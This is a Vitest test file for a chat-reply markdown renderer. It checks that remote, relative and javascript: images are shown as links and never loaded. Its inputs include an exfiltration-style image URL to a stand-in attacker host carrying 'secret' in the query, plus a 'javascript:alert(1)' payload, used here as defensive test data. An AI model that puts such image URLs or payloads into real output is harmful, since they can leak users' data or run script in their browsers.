import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { Streamdown } from 'streamdown';

import { replyRehypePlugins } from './reply-markdown';

const render = (markdown: string) => renderToStaticMarkup(<Streamdown mode="static" rehypePlugins={replyRehypePlugins}>{markdown}</Streamdown>);

describe('reply markdown', () => {
  it('shows a remote image as a link, without loading or preloading it', () => {
    const html = render('![chart](https://evil.example/leak?d=secret)');
    expect(html).not.toContain('evil.example');
    expect(html).not.toMatch(/<img|<link/);
    expect(html).toMatch(/data-streamdown="link"[^>]*>Image: chart</);
  });

  it('does the same for an image written as HTML', () => {
    const html = render('<img src="https://evil.example/x.png">');
    expect(html).not.toMatch(/<img|<link/);
    expect(html).toContain('>Image: https://evil.example/x.png<');
  });

  it('a relative image is not loaded either', () => {
    expect(render('![x](/api/secret.png)')).not.toMatch(/<img|<link/);
  });

  it('a javascript: image goes nowhere', () => {
    const html = render('![x](javascript:alert(1))');
    expect(html).not.toMatch(/<img/);
    expect(html).not.toContain('javascript:');
  });

  it('text and ordinary links render as before', () => {
    const html = render('**bold** and [docs](https://example.com/a)');
    expect(html).toContain('data-streamdown="strong"');
    expect(html).toMatch(/data-streamdown="link"[^>]*>docs</);
  });
});
